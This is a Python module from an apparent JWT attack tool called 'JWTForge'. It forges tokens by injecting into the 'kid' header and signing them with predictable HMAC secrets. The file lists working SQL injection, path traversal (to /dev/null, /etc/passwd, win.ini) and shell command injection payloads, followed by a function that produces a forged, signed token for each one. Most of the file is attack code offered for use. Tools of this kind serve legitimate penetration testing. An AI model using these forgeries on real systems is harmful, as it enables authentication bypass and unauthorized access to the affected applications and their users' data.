"""
JWTForge - KID (Key ID) Header Injection Attack

The 'kid' (Key ID) header parameter tells the server which key to use
for signature verification. If the application uses the kid value in:
  - A SQL query (SQL injection)
  - A file path lookup (path traversal)
  - A shell command (command injection)

An attacker can control the key used for verification.

Common Attack Vectors:
  1. SQL Injection: kid = "' UNION SELECT 'attacker_key' --"
  2. Path Traversal: kid = "../../dev/null" (sign with empty key)
  3. Command Injection: kid = "| echo attacker_key"
  4. Directory Traversal to known files
"""

import hmac
import hashlib
import json
from typing import List, Dict, Any, Optional

from ..core.parser import JWTParser, b64url_encode


# SQL Injection payloads for kid field
SQL_INJECTION_PAYLOADS = [
    {
        'type': 'sql_union_basic',
        'kid': "' UNION SELECT 'jwtforge' --",
        'secret': 'jwtforge',
        'description': 'Basic UNION injection — secret becomes "jwtforge"',
    },
    {
        'type': 'sql_union_blank',
        'kid': "' UNION SELECT '' --",
        'secret': '',
        'description': 'UNION injection with empty string secret',
    },
    {
        'type': 'sql_union_null',
        'kid': "' UNION SELECT NULL --",
        'secret': '',
        'description': 'UNION injection returning NULL (treated as empty)',
    },
    {
        'type': 'sql_where_false',
        'kid': "xxx' OR '1'='1",
        'secret': '',
        'description': 'OR injection — may cause fallback to null/empty key',
    },
    {
        'type': 'sql_union_mysql',
        'kid': "' UNION SELECT 'jwtforge'-- -",
        'secret': 'jwtforge',
        'description': 'MySQL-style UNION injection',
    },
    {
        'type': 'sql_union_postgres',
        'kid': "' UNION SELECT 'jwtforge'; --",
        'secret': 'jwtforge',
        'description': 'PostgreSQL-style UNION injection',
    },
    {
        'type': 'sql_union_mssql',
        'kid': "'; SELECT 'jwtforge'--",
        'secret': 'jwtforge',
        'description': 'MSSQL-style stacked query',
    },
]

# Path traversal payloads for kid field
PATH_TRAVERSAL_PAYLOADS = [
    {
        'type': 'path_dev_null',
        'kid': '../../dev/null',
        'secret': '',
        'description': '/dev/null is empty — sign with empty string',
    },
    {
        'type': 'path_dev_null_abs',
        'kid': '/dev/null',
        'secret': '',
        'description': 'Absolute path to /dev/null',
    },
    {
        'type': 'path_proc_zero',
        'kid': '/proc/sys/kernel/randomize_va_space',
        'secret': '2',
        'description': 'Known file content "2" — predictable secret',
    },
    {
        'type': 'path_etc_passwd',
        'kid': '../../etc/passwd',
        'secret': '',
        'description': 'Path traversal to /etc/passwd (secret = file content)',
    },
    {
        'type': 'path_traversal_windows',
        'kid': '..\\..\\windows\\win.ini',
        'secret': '',
        'description': 'Windows path traversal',
    },
    {
        'type': 'path_traversal_deep',
        'kid': '../../../../../dev/null',
        'secret': '',
        'description': 'Deep path traversal to /dev/null',
    },
]

# Command injection payloads for kid field
COMMAND_INJECTION_PAYLOADS = [
    {
        'type': 'cmd_echo',
        'kid': 'key|echo jwtforge',
        'secret': 'jwtforge',
        'description': 'Pipe to echo — output becomes secret',
    },
    {
        'type': 'cmd_semicolon',
        'kid': 'key; echo jwtforge',
        'secret': 'jwtforge',
        'description': 'Semicolon command injection',
    },
    {
        'type': 'cmd_backtick',
        'kid': '`echo jwtforge`',
        'secret': 'jwtforge',
        'description': 'Backtick command substitution',
    },
    {
        'type': 'cmd_dollar',
        'kid': '$(echo jwtforge)',
        'secret': 'jwtforge',
        'description': 'Dollar sign command substitution',
    },
]


def _sign_with_secret(parser: JWTParser, new_header: Dict, secret: str, alg: str = 'HS256') -> str:
    """Sign a JWT with an HMAC secret."""
    h = b64url_encode(json.dumps(new_header, separators=(',', ':')).encode())
    p = b64url_encode(json.dumps(parser.payload, separators=(',', ':')).encode())
    signing_input = f"{h}.{p}".encode()

    fn_map = {'HS256': hashlib.sha256, 'HS384': hashlib.sha384, 'HS512': hashlib.sha512}
    fn = fn_map.get(alg, hashlib.sha256)
    sig = hmac.new(secret.encode('utf-8'), signing_input, fn).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


def attack_kid_injection(
    token: str,
    attack_type: str = 'all',
    custom_kid: Optional[str] = None,
    custom_secret: Optional[str] = None,
    sign_alg: str = 'HS256',
) -> List[Dict[str, Any]]:
    """
    Generate KID injection attack payloads.

    Args:
        token: Original JWT string
        attack_type: 'sql', 'path', 'cmd', 'all', or 'custom'
        custom_kid: Custom kid value (for 'custom' type)
        custom_secret: Custom signing secret
        sign_alg: HMAC algorithm to sign with

    Returns:
        List of result dicts with forged tokens
    """
    parser = JWTParser(token)
    results = []

    # Determine which payloads to use
    if attack_type == 'sql':
        payloads = SQL_INJECTION_PAYLOADS
    elif attack_type == 'path':
        payloads = PATH_TRAVERSAL_PAYLOADS
    elif attack_type == 'cmd':
        payloads = COMMAND_INJECTION_PAYLOADS
    elif attack_type == 'custom':
        if not custom_kid:
            return [{'attack': 'kid_injection', 'status': 'error', 'detail': '--kid value required for custom type'}]
        payloads = [{
            'type': 'custom',
            'kid': custom_kid,
            'secret': custom_secret or '',
            'description': f'Custom KID: {custom_kid}',
        }]
    else:  # 'all'
        payloads = SQL_INJECTION_PAYLOADS + PATH_TRAVERSAL_PAYLOADS + COMMAND_INJECTION_PAYLOADS

    for pl in payloads:
        try:
            secret = custom_secret if custom_secret is not None else pl['secret']
            kid_value = pl['kid']

            new_header = dict(parser.header)
            new_header['kid'] = kid_value

            # Ensure we're using HS256 (the server should use the injected key)
            if parser.get_algorithm().startswith('HS') or True:
                new_header['alg'] = sign_alg

            forged = _sign_with_secret(parser, new_header, secret, sign_alg)

            results.append({
                'attack': 'kid_injection',
                'type': pl['type'],
                'kid_value': kid_value,
                'secret': repr(secret),
                'token': forged,
                'status': 'success',
                'note': pl['description'],
                'detail': f"KID={repr(kid_value)} secret={repr(secret)}",
            })
        except Exception as e:
            results.append({
                'attack': 'kid_injection',
                'type': pl.get('type', 'unknown'),
                'status': 'error',
                'detail': str(e),
            })

    return results


def get_kid_summary() -> Dict[str, int]:
    """Return count of available KID injection payloads by type."""
    return {
        'sql_injection': len(SQL_INJECTION_PAYLOADS),
        'path_traversal': len(PATH_TRAVERSAL_PAYLOADS),
        'command_injection': len(COMMAND_INJECTION_PAYLOADS),
        'total': len(SQL_INJECTION_PAYLOADS) + len(PATH_TRAVERSAL_PAYLOADS) + len(COMMAND_INJECTION_PAYLOADS),
    }
